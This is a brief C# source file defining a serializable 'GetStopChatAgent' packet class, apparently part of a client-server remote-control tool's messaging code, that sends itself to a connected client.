using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetStopChatAgent : IPacket
    {
        string Sender { get; set; }

        public GetStopChatAgent()
        {
            Sender = "Server";
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
